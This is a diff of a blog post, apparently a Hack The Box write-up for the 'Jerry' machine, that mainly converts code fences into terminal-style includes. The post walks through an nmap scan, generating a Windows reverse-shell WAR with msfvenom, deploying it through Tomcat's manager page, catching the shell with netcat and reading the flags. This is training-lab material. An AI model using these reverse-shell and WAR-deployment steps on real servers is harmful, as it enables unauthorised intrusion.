@@ -27,8 +27,7 @@ Jerry! Jerry! Jerry!
 
 Get all the open ports with nmap.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/jerry]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.95                    
 [sudo] password for kali: 
@@ -56,8 +55,12 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Navigate to the web server running on 8080.
@@ -107,8 +110,7 @@ Notice the section of the page to deploy a Java war secion.
 <br />
 Use msfvenom to generate a war exploit.
 
-{% raw %}
-```sh
+{% capture genmsfvenom %}
 ┌──(kali㉿kali)-[~/Documents/htb/jerry]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f war -o shell.war
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -117,14 +119,17 @@ No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of war file: 52154 bytes
 Saved as: shell.war
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=genmsfvenom %}
 
 <br />
 Unzip the war and note the name of the jsp file.
 
-{% raw %}
-```sh
+{% capture checkname %}
 ┌──(kali㉿kali)-[~/Documents/htb/jerry]
 └─$ unzip shell.war                           
 Archive:  shell.war
@@ -137,19 +142,26 @@ Archive:  shell.war
 ┌──(kali㉿kali)-[~/Documents/htb/jerry]
 └─$ ls
 META-INF  WEB-INF  nmap  shell.war  zwqjmwevu.jsp
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=checkname %}
 
 <br />
 Start a listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/jerry]
 └─$ nc -nlvp 4444                          
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Click Browse and in the dialog box double-click on the war file.
@@ -181,23 +193,35 @@ Navigate to the war file and the to the jsp file that we noted earlier.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
-┌──(kali㉿kali)-[~/Documents/htb/jerry]
+{% capture catchshell %}
+─(kali㉿kali)-[~/Documents/htb/jerry]
 └─$ nc -nlvp 4444                          
 listening on [any] 4444 ...
 connect to [10.10.16.3] from (UNKNOWN) [10.10.10.95] 49192
+{% endcapture %}
+
+{% capture windowsshell %}
+┌─
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\apache-tomcat-7.0.88>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=windowsshell %}
 
 <br />
+Get both flags in one file.  Wooooeeeee!
 
-{% raw %}
-```sh
+{% capture getflags %}
 C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
 type "2 for the price of 1.txt"
 user.txt
@@ -221,9 +245,13 @@ Ethernet adapter Ethernet0:
 Tunnel adapter isatap.{4C9FEAFE-6811-4938-BFB6-5A3280613EF9}:
 
    Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-```
-{% endraw %}
+   Connection-specific DNS Suffix  . :
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=getflags %}
 
 <br />
 And with that, another one bites the dust.
